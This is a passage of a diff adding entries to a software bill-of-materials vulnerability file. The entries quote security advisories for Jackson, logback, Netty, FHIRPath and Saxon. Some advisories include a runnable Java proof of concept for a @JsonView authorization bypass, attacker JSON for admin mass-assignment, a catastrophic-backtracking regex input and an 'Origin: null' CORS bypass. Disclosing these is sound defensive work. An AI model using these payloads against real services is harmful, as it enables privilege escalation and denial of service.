a\nsmall helper in `XMLUtil`:\n\n```java\n@SuppressWarnings(\"checkstyle:transformerFactoryNewInstance\")\npublic static TransformerFactory newXXEProtectedSaxonTransformerFactory() {\n    final TransformerFactory f = new net.sf.saxon.TransformerFactoryImpl();\n    f.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, \"\");\n    f.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, \"\");\n    return f;\n}\n```\n\nand replace each `new net.sf.saxon.TransformerFactoryImpl()` in\n`XsltUtilities.saxonTransform(...)` (lines 61, 91, 106) with a call to it. This\nmirrors the existing `newXXEProtected*` convention and the class-level mandate\nthat the protected factory \"should be the only place where TransformerFactory\nis instantiated in this project\". A regression test that runs a DOCTYPE-bearing\nsource through `saxonTransform` and asserts the external entity is NOT resolved\nshould accompany the change.\n\n### Credit\n\nReported by tonghuaroot.",
+      "published" : "2026-06-17T18:47:51Z",
+      "updated" : "2026-06-17T18:47:52Z",
+      "analysis" : {
+        "state" : "not_affected",
+        "justification" : "code_not_reachable",
+        "detail" : "transform operations from XSL utilities are not used."
+      },
+      "affects" : [
+        {
+          "ref" : "77510be1-23d7-4d26-b9eb-6ca2ce830c22"
+        }
+      ]
+    },
+    {
+      "bom-ref" : "7e538f3b-3931-4c1c-8c27-b4ddf60d99b8",
+      "id" : "GHSA-5jmj-h7xm-6q6v",
+      "source" : {
+        "name" : "GITHUB",
+        "url" : "https://github.com/advisories"
+      },
+      "ratings" : [
+        {
+          "source" : {
+            "name" : "GITHUB",
+            "url" : "https://github.com/advisories"
+          },
+          "score" : 5.3,
+          "severity" : "medium",
+          "method" : "CVSSv31",
+          "vector" : "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N"
+        }
+      ],
+      "cwes" : [
+        915
+      ],
+      "description" : "## Summary\nIn `BeanDeserializerBase.createContextual()`, per-property `@JsonIgnoreProperties` exclusions are applied by `_handleByNameInclusion()`, producing a `contextual` deserializer whose `BeanPropertyMap` has the ignored properties removed. The subsequent per-property case-insensitivity block (triggered by `@JsonFormat(ACCEPT_CASE_INSENSITIVE_PROPERTIES)`) rebuilds from `this._beanProperties` (the original, unfiltered map) instead of `contextual._beanProperties`, then overwrites the filtered map — restoring every property `_handleByNameInclusion` had just removed. The ignored property becomes writable again.\n\n## Impact\nAn application that both enables case-insensitive matching and relies on per-property `@JsonIgnoreProperties` to keep a field unwritable can have that field set from untrusted JSON (mass-assignment-style write).\n\n## Affected / Patched\nWill be fixed in 2.18.9, 2.21.5, 2.22.1 and 3.1.4.\n\n## Severity / CWE\nMaintainer: minor. Reporter: Moderate. CWE-915.\n\n## Upstream fix\nFasterXML/jackson-databind#5962 (PR #5964, `0e1b0b2`), milestone 3.1.4. Released 2026-06-04.",
+      "published" : "2026-06-23T21:23:58Z",
+      "updated" : "2026-07-16T21:25:47Z",
+      "affects" : [
+        {
+          "ref" : "77510be1-23d7-4d26-b9eb-6ca2ce830c22"
+        }
+      ]
+    },
+    {
+      "bom-ref" : "40e46fc4-78d0-4aa0-907e-f2cb7ff6625f",
+      "id" : "GHSA-jhq6-gfmj-v8fx",
+      "source" : {
+        "name" : "GITHUB",
+        "url" : "https://github.com/advisories"
+      },
+      "ratings" : [
+        {
+          "source" : {
+            "name" : "GITHUB",
+            "url" : "https://github.com/advisories"
+          },
+          "score" : 2.9,
+          "severity" : "low",
+          "method" : "CVSSv4",
+          "vector" : "CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:N/VC:L/VI:L/VA:N/SC:L/SI:L/SA:N/E:P/RE:M/U:Green"
+        }
+      ],
+      "cwes" : [
+        502
+      ],
+      "description" : "Deserialization of untrusted data vulnerability in QOS.CH Sarl logback logback-core (HardenedObjectInputStream (logback-core) modules) allows Object Injection, albeit heavily restricted.\n\nMore precisely, an attacker able to influence serialized data sent to SimpleSocketServer or SimpleSSLSocketServer can instantiate Proxy objects.\n\n\nAlthough deserialization is heavily restricted by HardenedObjectInputStream and no practical way to achieve remote code execution or significant privilege  escalation has been identified, this issue constitutes a bypass of the  intended security restrictions.\n\n\n\nThis issue affects logback: through 1.5.33 inclusive.",
+      "published" : "2026-06-01T15:30:40Z",
+      "updated" : "2026-07-15T21:52:55Z",
+      "affects" : [
+        {
+          "ref" : "77510be1-23d7-4d26-b9eb-6ca2ce830c22"
+        }
+      ]
+    },
+    {
+      "bom-ref" : "bf746035-1649-424c-9bb3-0a139ad6edfe",
+      "id" : "GHSA-7cmj-v6x8-frvv",
+      "source" : {
+        "name" : "GITHUB",
+        "url" : "https://github.com/advisories"
+      },
+      "ratings" : [
+        {
+          "source" : {
+            "name" : "GITHUB",
+            "url" : "https://github.com/advisories"
+          },
+          "score" : 7.5,
+          "severity" : "high",
+          "method" : "CVSSv31",
+          "vector" : "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+        }
+      ],
+      "cwes" : [
+        400,
+        1333
+      ],
+      "description" : "# Summary\nAll implementations of FHIRPathEngine accept arbitrary FHIRPath expressions and evaluate them without input validation. The utility intended to secure this evaluation did so incorrectly, and did not fully cover all places in which evaluation was being done. An attacker can send a resource containing an evil regex pattern that causes catastrophic backtracking, exhausting system resources, and causing Denial-of-Service.\n\n## Details\nThe vulnerability exists in regex execution in FHIRPathEngine implementations across multiple code modules. The FHIRPath functions matches(), matchesFull(), and replaceMatches() pass user-controlled regular expressions to Java's Pattern.compile() and String.replaceAll() through a utility class designed to time out after a specified interval. That utility correctly cancelled a single executor thread and returned with an exception, but the execution within the thread had no means to listen for this cancellation and would persist. Furthermore, three modules contained method calls in FHIRPathEngine that were not protected by this utility class.\n\n## Why this is exploitable:\n\nJava's Pattern.compile() with a pattern like (a+)+$ against input \"aaaaaaaaaaaaaaaaaaaaaa!\" causes exponential backtracking (O(2^n) time complexity). \n\n## Impact\nCPU Exhaustion: The exponential backtracking in Java's regex engine consumes 100% of a CPU core for the duration of the hang (effectively infinite for sufficiently long input strings) for callers of FHIRPathEngine.",
+      "published" : "2026-07-09T13:43:03Z",
+      "updated" : "2026-07-09T13:43:04Z",
+      "analysis" : {
+        "state" : "not_affected"
+      },
+      "affects" : [
+        {
+          "ref" : "77510be1-23d7-4d26-b9eb-6ca2ce830c22"
+        }
+      ]
+    },
+    {
+      "bom-ref" : "9b0a5f61-5fe7-4598-9226-4cb4ae572991",
+      "id" : "GHSA-5gvw-p9qm-jgwh",
+      "source" : {
+        "name" : "GITHUB",
+        "url" : "https://github.com/advisories"
+      },
+      "ratings" : [
+        {
+          "source" : {
+            "name" : "GITHUB",
+            "url" : "https://github.com/advisories"
+          },
+          "score" : 6.5,
+          "severity" : "medium",
+          "method" : "CVSSv31",
+          "vector" : "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N"
+        }
+      ],
+      "cwes" : [
+        863
+      ],
+      "description" : "## Summary\n`UnwrappedPropertyHandler.processUnwrapped()` replays the buffered JSON for a `@JsonUnwrapped` property by iterating its properties and calling `prop.deserializeAndSet()` with **no `prop.visibleInView(ctxt.getActiveView())` guard** — the exact guard `processUnwrappedCreatorProperties()` received in the #5971 / GHSA-rcqc-6cw3-h962 fix, and the guard `BeanDeserializer.deserializeWithUnwrapped` applies to directly-matched properties. As a result, a property annotated with both `@JsonView(PrivilegedView.class)` and `@JsonUnwrapped` is written from attacker JSON even when deserializing under a more-restrictive active view.\n\n**Correction to the original framing (runtime-verified):** the gap is NOT a per-field inner `@JsonView` (the unwrapped sub-object's own `BeanDeserializer` gates inner fields correctly). The unchecked gate is the **view of the unwrapped CONTAINER property**.\n\n## Intent proof (runtime, 2.x HEAD 21dd70dd and 3.x HEAD 7a5939d6)\nAn `@JsonView(AdminView)` property that is NOT `@JsonUnwrapped` → `null` under `PublicView` (correctly gated). The identical property WITH `@JsonUnwrapped` → fully populated (bypass). The fix the creator path already received, not applied to the regular-property method.\n\n## Impact — write-side mass-assignment / privilege escalation\n`@JsonView` is commonly used as a write-side authorization guard: a public endpoint binds the body under `readerWithView(PublicView.class)` and groups privileged state in a nested object whose container property is `@JsonView(AdminView)`. When that property is `@JsonUnwrapped`, an untrusted caller mass-assigns it. PoC: a self-service registration where `AccountFlags{role,approved,creditBalance}` is `@JsonView(AdminView) @JsonUnwrapped`; attacker JSON `{role:ADMIN,approved:true,creditBalance:1000000}` under `PublicView` binds all three → approved admin with arbitrary balance. The failing gate is a WRITE gate, hence integrity-high (`C:N/I:H/A:N`); no worse than the C:L/I:L parent and arguably higher as `@JsonView`-as-write-guard is the exact use case #5971/#5969 defended.\n\n## Affected\n- `com.fasterxml.jackson.core:jackson-databind` 2.x: confirmed bypass at 21dd70dd (== released 2.21.4 / 2.22.0 line; includes the #5973 backport). `DEFAULT_VIEW_INCLUSION` default=true.\n- `tools.jackson.core:jackson-databind` 3.x: confirmed bypass at HEAD 7a5939d6 (latest 3.x). `DEFAULT_VIEW_INCLUSION` default=false → the stock-config repro is the common shape where privileged inner fields are individually `@JsonView(PublicView)` and the developer relies on the container `@JsonView(AdminView)`; the 3.x PoC mass-assigns role/approved/creditBalance under PublicView. (The other simultaneous report's PoC was reportedly fixed on 3.x; this distinct container-property path is not.)\n\n## Additive variants (runtime-confirmed both branches; all closed by the same one-line guard)\n- nested `@JsonUnwrapped` (unwrapped-in-unwrapped) — recursive bypass.\n- merge / `readerWithView(...).withValueToUpdate(...)` (PATCH/partial-update) — bypass; non-unwrapped merge control gates correctly.\n- builder-based deserializer (`@JsonDeserialize(builder=...)`) — `BuilderBasedDeserializer` routes through the same `processUnwrapped`.\n- Honest non-findings: read-side serialization correctly honors views (no leak); `@JsonAnySetter`+view and `@JsonTypeInfo`+`@JsonUnwrapped` are separate/unsupported behaviors, not this bug.\n\n## Fix\nAdd `prop.visibleInView(ctxt.getActiveView())` (when `MapperFeature.DEFAULT_VIEW_INCLUSION`/active-view applies) to the `processUnwrapped()` property loop, mirroring `processUnwrappedCreatorProperties()`. One change closes the impact PoC + all three variants across `BeanDeserializer` and `BuilderBasedDeserializer`. Full runnable PoCs (2.x + 3.x) + variant harnesses available on request.",
+      "published" : "2026-07-21T22:00:43Z",
+      "updated" : "2026-08-03T20:51:32Z",
+      "affects" : [
+        {
+          "ref" : "77510be1-23d7-4d26-b9eb-6ca2ce830c22"
+        }
+      ]
+    },
+    {
+      "bom-ref" : "359b531c-400f-4782-be59-e56c50a853ef",
+      "id" : "GHSA-mhm7-754m-9p8w",
+      "source" : {
+        "name" : "GITHUB",
+        "url" : "https://github.com/advisories"
+      },
+      "ratings" : [
+        {
+          "source" : {
+            "name" : "GITHUB",
+            "url" : "https://github.com/advisories"
+          },
+          "score" : 6.5,
+          "severity" : "medium",
+          "method" : "CVSSv31",
+          "vector" : "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N"
+        }
+      ],
+      "cwes" : [
+        863
+      ],
+      "description" : "## Summary\n\nIn `BeanDeserializer.deserializeUsingPropertyBasedWithExternalTypeId`, the active-view (`@JsonView`) filter was applied only to the regular bean-property branch; the creator-property branch performed no `creatorProp.visibleInView(activeView)` check. A constructor parameter annotated with both `@JsonView(RestrictedView.class)` and `@JsonTypeInfo(use=Id.NAME,\n  include=As.EXTERNAL_PROPERTY)` is populated from attacker JSON even when a more restrictive view is active.\n\n  This is a patch gap. GHSA-5hh8 (CVE-2026-54517) and GHSA-rcqc (CVE-2026-54518) descriptions cover only the main property-based path and the unwrapped-creator path respectively; the external-type-id creator path was fixed on the 3.x line via #6004 (\"Extend #5969/#5971 fixes to ... external-type-id case in regular BeanDeserializer\", commit 7dc7a17, 2026-05-22) but\n  **the fix was never backported to 2.21 or 2.18**. Users on 2.21.4 and 2.18.8 who upgraded per the published advisories remain vulnerable to the same `@JsonView` bypass technique via a different code path.\n\n## Vulnerable Code Path\n\nFile: `com/fasterxml/jackson/databind/deser/BeanDeserializer.java`\nMethod: `deserializeUsingPropertyBasedWithExternalTypeId`\n\nOn 2.21.4 (and 2.18.8), the creator-property branch (around line 1125-1158) checks `creatorProp.isInjectionOnly()` and hands off to `ext.handlePropertyValue(...)` / `buffer.assignParameter(...)` without ever consulting `visibleInView(activeView)`:\n\n ```java\n  if (creatorProp != null) {\n      // [databind#1381]: if useInput=FALSE, skip deserialization from input\n      if (creatorProp.isInjectionOnly()) { ... }\n      // NO visibleInView(activeView) CHECK HERE\n      if (!ext.handlePropertyValue(p, ctxt, propName, null)) {\n          if (buffer.assignParameter(creatorProp, ...)) { ... }\n      }\n      continue;\n  }\n```\n\nOn 3.1.4, the same branch contains the additional guard (commit 7dc7a17):\n\n ```java\n   if (creatorProp != null) {\n      // [databind#5971]: must honor active view here too\n      if ((activeView != null) && !creatorProp.visibleInView(activeView)) {\n          p.skipChildren();\n          continue;\n      }\n      ...\n  }\n```\n\nThe 2.21 and 2.18 backport PRs (#6005 and #6003) only backported the main-path fixes from #5969/#5971; the external-type-id fix from #6004 was not backported. The maintainer closed #6005\n  with \"got changes merged forward, looks like it's all covered now\", but the forward-merge did not include the ExtTypeId creator branch.\n\n  Proof of Concept\n\n  Compiles and runs against jackson-databind 2.21.4:\n \n```java\n  import com.fasterxml.jackson.annotation.*;\n  import com.fasterxml.jackson.databind.ObjectMapper;\n\n  public class JsonViewExternalTypeIdBypass {\n      public static class PublicView {}\n      public static class AdminView extends PublicView {}\n\n      public static abstract class Asset { public String name; }\n      public static class PublicAsset extends Asset {}\n      public static class AdminAsset extends Asset { public String secret; }\n\n      public static class Container {\n          @JsonTypeInfo(use = JsonTypeInfo.Id.NAME,\n                  include = JsonTypeInfo.As.EXTERNAL_PROPERTY,\n                  property = \"kind\")\n          @JsonSubTypes({\n              @JsonSubTypes.Type(value = PublicAsset.class, name = \"pub\"),\n              @JsonSubTypes.Type(value = AdminAsset.class,  name = \"admin\")\n          })\n          @JsonView(AdminView.class)\n          public Asset asset;\n\n          public String label;\n\n          @JsonCreator\n          public Container(\n                  @JsonProperty(\"label\") String label,\n                  @JsonProperty(\"asset\") @JsonView(AdminView.class) Asset asset) {\n              this.label = label;\n              this.asset = asset;\n          }\n      }\n\n      public static class Wrapper {\n          @JsonView(PublicView.class)\n          public Container data;\n      }\n\n      public static void main(String[] args) throws Exception {\n          // Admin-only \"asset\" should be blocked when reading with PublicView\n          String json = \"{\\\"data\\\":{\\\"label\\\":\\\"hello\\\",\\\"kind\\\":\\\"admin\\\",\"\n                      + \"\\\"asset\\\":{\\\"name\\\":\\\"foo\\\",\\\"secret\\\":\\\"LEAKED\\\"}}}\";\n\n          ObjectMapper om = new ObjectMapper();\n          Wrapper r = om.readerWithView(PublicView.class)\n                  .forType(Wrapper.class)\n                  .readValue(json);\n\n          System.out.println(r.data);\n          // Actual on 2.21.4:   Container{label='hello', asset=AdminAsset{name='foo', secret='LEAKED'}}\n          // Expected (secure):  Container{label='hello', asset=null}\n          if (r.data.asset != null && r.data.asset instanceof AdminAsset) {\n              System.out.println(\"[!!] BYPASS CONFIRMED — admin-only asset populated under PublicView\");\n          }\n      }\n  }\n```\n\nA control case that removes include = As.EXTERNAL_PROPERTY (forcing the normal property-based path) correctly returns asset = null, confirming the bypass is specific to the ExternalTypeId\n  code path and not a misconfiguration.\n\n### Impact\n\n  View-restricted (e.g. admin-only) creator properties can be populated from untrusted input where @JsonView is used as a write-side authorization boundary. Typical victims are Spring Boot\n  REST controllers that use @JsonView(PublicView.class) on the request body to whitelist user-settable fields — an attacker can inject the restricted creator parameter (including choosing\n  the polymorphic subtype via the sibling kind/type-id property) by combining it with a polymorphic @JsonTypeInfo(EXTERNAL_PROPERTY) annotation on the same field.\n\n- CWE-863 (Incorrect Authorization)\n- Same impact class as CVE-2026-54517 / CVE-2026-54518\n- No RCE, no DoS — this is an access-control / mass-assignment bypass\n\n### Trigger Conditions\n\nDeveloper code must combine (no opt-in user configuration required):\n\n1. Property-based @JsonCreator on the outer type\n2. A creator parameter annotated with @JsonView(RestrictedView.class)\n3. The same parameter annotated with @JsonTypeInfo(use=Id.NAME, include=As.EXTERNAL_PROPERTY, property=\"...\")",
+      "published" : "2026-07-21T19:40:12Z",
+      "updated" : "2026-07-21T19:40:13Z",
+      "affects" : [
+        {
+          "ref" : "77510be1-23d7-4d26-b9eb-6ca2ce830c22"
+        }
+      ]
+    },
+    {
+      "bom-ref" : "9d6ef744-5e0a-4574-b08c-576a7be068aa",
+      "id" : "GHSA-c69g-56f8-xwqj",
+      "source" : {
+        "name" : "GITHUB",
+        "url" : "https://github.com/advisories"
+      },
+      "ratings" : [
+        {
+          "source" : {
+            "name" : "GITHUB",
+            "url" : "https://github.com/advisories"
+          },
+          "score" : 6.9,
+          "severity" : "medium",
+          "method" : "CVSSv4",
+          "vector" : "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:N/SC:L/SI:L/SA:N"
+        }
+      ],
+      "cwes" : [
+        444
+      ],
+      "description" : "Netty's HTTP/2-to-HTTP/1.x translation layer (`Http2StreamFrameToHttpObjectCodec` and `InboundHttp2ToHttpAdapter`) fails to deduplicate or validate `Host` headers when an HTTP/2 client supplies both the `:authority` pseudo-header and a literal `host` header in a single HEADERS frame. The translator maps `:authority` to `Host` and separately copies the literal `host` header, producing an `HttpRequest` object containing two `Host` headers with attacker-controlled differing values.",
+      "published" : "2026-07-22T21:49:28Z",
+      "updated" : "2026-07-22T21:49:28Z",
+      "affects" : [
+        {
+          "ref" : "77510be1-23d7-4d26-b9eb-6ca2ce830c22"
+        }
+      ]
+    },
+    {
+      "bom-ref" : "58f87036-31be-400d-8137-116ae29298ee",
+      "id" : "GHSA-558v-64gr-wgg4",
+      "source" : {
+        "name" : "GITHUB",
+        "url" : "https://github.com/advisories"
+      },
+      "ratings" : [
+        {
+          "source" : {
+            "name" : "GITHUB",
+            "url" : "https://github.com/advisories"
+          },
+          "score" : 8.7,
+          "severity" : "high",
+          "method" : "CVSSv4",
+          "vector" : "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N"
+        }
+      ],
+      "cwes" : [
+        835
+      ],
+      "description" : "The `Bzip2Decoder` handler in Netty's compression codec pipeline is vulnerable to a denial-of-service attack through a malformed bzip2 stream that permanently captures the event-loop thread in an infinite loop. The vulnerability exists in the run-length encoding (RLE) state machine within [`Bzip2BlockDecompressor.read()`]",
+      "published" : "2026-07-22T21:50:47Z",
+      "updated" : "2026-07-22T21:50:48Z",
+      "analysis" : {
+        "state" : "not_affected"
+      },
+      "affects" : [
+        {
+          "ref" : "77510be1-23d7-4d26-b9eb-6ca2ce830c22"
+        }
+      ]
+    },
+    {
+      "bom-ref" : "f3a5424c-a6e7-4c0a-b543-45940f76323f",
+      "id" : "GHSA-6jqx-86gh-f27w",
+      "source" : {
+        "name" : "GITHUB",
+        "url" : "https://github.com/advisories"
+      },
+      "ratings" : [
+        {
+          "source" : {
+            "name" : "GITHUB",
+            "url" : "https://github.com/advisories"
+          },
+          "score" : 7.5,
+          "severity" : "high",
+          "method" : "CVSSv31",
+          "vector" : "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+        }
+      ],
+      "cwes" : [
+        400
+      ],
+      "description" : "### Summary\nNetty's SPDY SETTINGS decoder accepts a peer-declared SETTINGS entry count up to the 24-bit frame-length limit and materializes every unique setting ID in `DefaultSpdySettingsFrame` without an implementation-level count cap. A remote SPDY/3.1 peer can send one syntactically valid roughly 2 MiB SETTINGS frame that creates 262144 map entries, amplifying network input into heap growth and ordered-map insertion work.\n\n### Details\nInbound SPDY bytes enter `SpdyFrameCodec.decode()` and are passed directly to the frame decoder. The decoder reads the peer-controlled flags and 24-bit frame length from the common header, then accepts SETTINGS frames with only `length >= 4`. For SETTINGS payloads, it reads the peer-controlled `numSettings` field and validates only that the remaining payload is divisible into 8-byte entries and exactly matches that count. Each accepted entry then supplies an attacker-controlled 24-bit ID and value, and the normal delegate path forwards it into `spdySettingsFrame.setValue()`. The sink is `DefaultSpdySettingsFrame`: it backs settings with a `TreeMap`, checks only that IDs fit the SPDY 24-bit maximum, and inserts a new `Setting` for each previously unseen ID. There is no count budget between the wire-format count validation and the TreeMap insertion site.\n\n### PoC\n[poc.zip](https://github.com/user-attachments/files/28445737/poc.zip)\n\nrun with\n```bash\nbash ./poc/run.sh\n```\n\nexpected output:\n```text\nNETTY_SPDY_SETTINGS_COUNT_MAP_TRIGGERED settings_count=262144 wire_bytes=2097164 approx_heap_delta=17692272 first_value=1 last_value=262144\n```\n\nThe `NETTY_SPDY_SETTINGS_COUNT_MAP_TRIGGERED` line means the harness decoded the crafted SETTINGS frame and observed all 262144 peer-selected IDs in the resulting settings map. The `wire_bytes=2097164`, `first_value=1`, and `last_value=262144` fields distinguish this from a setup failure: they show the exact oversized frame was accepted and fully materialized.\n\n### Impact\n remote unauthenticated network peer that can speak SPDY/3.1 to a Netty pipeline containing `SpdyFrameCodec` can trigger resource-exhaustion denial of service. The required guards are satisfied by a complete valid SETTINGS frame using the expected SPDY version, a length of `4 + numSettings * 8`, and IDs within the accepted 24-bit range; the verified PoC uses `numSettings=262144` and `wire_bytes=2097164`. On that input, Netty materializes 262144 attacker-controlled entries in a TreeMap-backed `DefaultSpdySettingsFrame`, with local runs observing about 17-18 MiB of heap growth per decoded frame plus CPU work for ordered-map insertion.",
+      "published" : "2026-07-22T21:07:36Z",
+      "updated" : "2026-07-22T21:07:37Z",
+      "analysis" : {
+        "state" : "not_affected"
+      },
+      "affects" : [
+        {
+          "ref" : "77510be1-23d7-4d26-b9eb-6ca2ce830c22"
+        }
+      ]
+    },
+    {
+      "bom-ref" : "2ba91fe5-f877-4677-9e04-552053d30b26",
+      "id" : "GHSA-mvh2-crg5-v77c",
+      "source" : {
+        "name" : "GITHUB",
+        "url" : "https://github.com/advisories"
+      },
+      "ratings" : [
+        {
+          "source" : {
+            "name" : "GITHUB",
+            "url" : "https://github.com/advisories"
+          },
+          "score" : 7.5,
+          "severity" : "high",
+          "method" : "CVSSv31",
+          "vector" : "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+        }
+      ],
+      "cwes" : [
+        400
+      ],
+      "description" : "### Summary\nNetty SPDY header decoding continues inflating zlib-compressed header blocks after the raw header parser has already exceeded maxHeaderSize and marked the frame truncated. At commit b2d2137c4404af425bf9d5d601a62576f5c06925, a 12,253-byte compressed SPDY header block can declare and inflate a 12 MiB header-name field with maxHeaderSize=16, forcing compression-amplified decode and skip work in a reachable SpdyFrameCodec pipeline.\n\n### PoC\n[poc.zip](https://github.com/user-attachments/files/28445780/poc.zip)\n\nrun with:\n```bash\nbash ./poc/run.sh\n```\nexpected output:\n```text\nNETTY_SPDY_ZLIB_DECODED_AFTER_LIMIT_TRIGGERED compressed_bytes=12253 declared_name_length=12582912 max_header_size=16 truncated=true invalid=false\n```\n\nThe fingerprint means the compressed input was fully consumed while the raw header parser ended with `truncated=true` and `invalid=false` after processing the oversized decoded name. That specific state distinguishes this bug from a generic setup failure: the maxHeaderSize guard fired, but the zlib/raw decode path still inflated and skipped the full 12 MiB declared name.\n\n### Impact\nA remote unauthenticated peer that can speak SPDY to a Netty pipeline containing SpdyFrameCodec can send a small compressed HEADERS block that expands into much larger raw header data after the configured maxHeaderSize limit has already been exceeded. The attack requires a reachable SPDY codec, ordinary transport setup such as TCP and optional TLS, and no independent compressed-frame-size or connection-rate limit ahead of SpdyFrameCodec. The satisfied protocol guards are straightforward: the HEADERS frame uses a nonzero stream id and length >= 4, the decoder factory selects the zlib decoder, the payload uses the SPDY dictionary, and the raw block appends a zero-length value so the already-truncated frame reaches END_HEADER_BLOCK. The user-visible effect is denial of service through compression-amplified CPU and allocation churn.",
+      "published" : "2026-07-22T21:23:05Z",
+      "updated" : "2026-07-22T21:23:06Z",
+      "analysis" : {
+        "state" : "not_affected"
+      },
+      "affects" : [
+        {
+          "ref" : "77510be1-23d7-4d26-b9eb-6ca2ce830c22"
+        }
+      ]
+    },
+    {
+      "bom-ref" : "2dfec769-04ee-4221-bb1b-d25a7f58a3d6",
+      "id" : "GHSA-jppx-w49h-x2qq",
+      "source" : {
+        "name" : "GITHUB",
+        "url" : "https://github.com/advisories"
+      },
+      "ratings" : [
+        {
+          "source" : {
+            "name" : "GITHUB",
+            "url" : "https://github.com/advisories"
+          },
+          "score" : 8.7,
+          "severity" : "high",
+          "method" : "CVSSv4",
+          "vector" : "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N"
+        }
+      ],
+      "cwes" : [
+        400
+      ],
+      "description" : "The `SpdyHttpDecoder` handler in Netty's SPDY-to-HTTP codec allocates a pooled `ByteBuf` when processing a client-initiated `SYN_STREAM` frame with `FLAG_FIN=0`, storing the partially-constructed `FullHttpRequest` in an internal map (`messageMap`) to accumulate subsequent `DATA` frames. When the remote peer sends an `RST_STREAM` for that stream, or when the accumulated content exceeds `maxContentLength`, the decoder removes the entry from the map but **never releases the pooled ByteBuf**, permanently leaking the allocated memory.",
+      "published" : "2026-07-22T21:32:24Z",
+      "updated" : "2026-07-22T21:32:26Z",
+      "analysis" : {
+        "state" : "not_affected"
+      },
+      "affects" : [
+        {
+          "ref" : "77510be1-23d7-4d26-b9eb-6ca2ce830c22"
+        }
+      ]
+    },
+    {
+      "bom-ref" : "1480d241-3fb5-43a4-afcf-1b26e5488279",
+      "id" : "GHSA-4mp9-239f-g9hg",
+      "source" : {
+        "name" : "GITHUB",
+        "url" : "https://github.com/advisories"
+      },
+      "ratings" : [
+        {
+          "source" : {
+            "name" : "GITHUB",
+            "url" : "https://github.com/advisories"
+          },
+          "score" : 6.3,
+          "severity" : "medium",
+          "method" : "CVSSv4",
+          "vector" : "CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:N/VC:N/VI:N/VA:N/SC:L/SI:L/SA:N"
+        }
+      ],
+      "cwes" : [
+        444
+      ],
+      "description" : "## Summary\nAn attacker can force WebSocket upgrade via the lax V07 (or V08) handshaker by sending `Sec-WebSocket-Version: 7` and omitting `Connection: Upgrade` / `Upgrade: websocket` headers, completing a protocol switch that a proxy would not recognize as an Upgrade request and enabling HTTP request smuggling / protocol-confusion attacks.",
+      "published" : "2026-07-22T21:48:59Z",
+      "updated" : "2026-07-22T21:49:03Z",
+      "affects" : [
+        {
+          "ref" : "77510be1-23d7-4d26-b9eb-6ca2ce830c22"
+        }
+      ]
+    },
+    {
+      "bom-ref" : "40627231-b158-403a-bcb3-84a7f7c68c9b",
+      "id" : "GHSA-q4f6-jm68-57ww",
+      "source" : {
+        "name" : "GITHUB",
+        "url" : "https://github.com/advisories"
+      },
+      "ratings" : [
+        {
+          "source" : {
+            "name" : "GITHUB",
+            "url" : "https://github.com/advisories"
+          },
+          "score" : 6.9,
+          "severity" : "medium",
+          "method" : "CVSSv4",
+          "vector" : "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N"
+        }
+      ],
+      "cwes" : [
+        770
+      ],
+      "description" : "### Impact\n`HttpContentEncoder` (the superclass of the production handler `HttpContentCompressor`) maintains a per-channel `ArrayDeque<CharSequence>` named `acceptEncodingQueue` that accumulates attacker-controlled data without any size limit. The queue is filled on the I/O thread for every inbound HTTP request and drained only when the application later writes a non-1xx response. This creates a resource exhaustion vulnerability when an attacker exploits HTTP/1.1 pipelining to flood the connection with requests faster than the application produces responses.",
+      "published" : "2026-07-22T21:49:13Z",
+      "updated" : "2026-07-22T21:49:14Z",
+      "affects" : [
+        {
+          "ref" : "77510be1-23d7-4d26-b9eb-6ca2ce830c22"
+        }
+      ]
+    },
+    {
+      "bom-ref" : "1ea8062f-9129-4f76-b093-fa441afb3430",
+      "id" : "GHSA-6cqp-g7gg-8hr5",
+      "source" : {
+        "name" : "GITHUB",
+        "url" : "https://github.com/advisories"
+      },
+      "ratings" : [
+        {
+          "source" : {
+            "name" : "GITHUB",
+            "url" : "https://github.com/advisories"
+          },
+          "score" : 6.5,
+          "severity" : "medium",
+          "method" : "CVSSv31",
+          "vector" : "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N"
+        }
+      ],
+      "cwes" : [
+        284
+      ],
+      "description" : "### Summary\nNetty's CorsHandler provides a `shortCircuit()` configuration designed to reject unauthorized cross-origin requests immediately, acting as a security control before requests reach the application. However, due to a logical operator error in the origin evaluation process, this protection can be entirely bypassed. An attacker can bypass the short-circuit mechanism by sending a request with an `Origin: null` header. This failure forwards unauthorized requests to the backend application, bypassing intended access controls.\n\n### Details\nIn `io.netty.handler.codec.http.cors.CorsHandler#channelRead`, the short-circuit logic relies on the configuration returned by `getForOrigin(origin)` to determine if an origin is authorized. If `getForOrigin` returns a configuration object, the short-circuit check `(!(origin == null || config != null))` is bypassed, and the request proceeds to the backend.\n\nThe vulnerability is located in the `getForOrigin` method:\n\n```java\n            if (corsConfig.isNullOriginAllowed() || NULL_ORIGIN.equals(requestOrigin)) {\n                return corsConfig;\n            }\n```\n\nIf an attacker sends `Origin: null`, `NULL_ORIGIN.equals(requestOrigin)` evaluates to true. The method returns the configuration object regardless of whether `isNullOriginAllowed()` was configured by the developer. The short-circuit is bypassed.\n\n### Impact\nApplications relying on CorsHandler's short-circuit feature to prevent unauthorized cross-origin requests from reaching their backend logic are completely exposed. The framework fails to enforce the developer's intended access controls, allowing unauthorized requests to be processed.",
+      "published" : "2026-07-22T21:42:17Z",
+      "updated" : "2026-07-22T21:42:19Z",
+      "affects" : [
+        {
+          "ref" : "77510be1-23d7-4d26-b9eb-6ca2ce830c22"
+        }
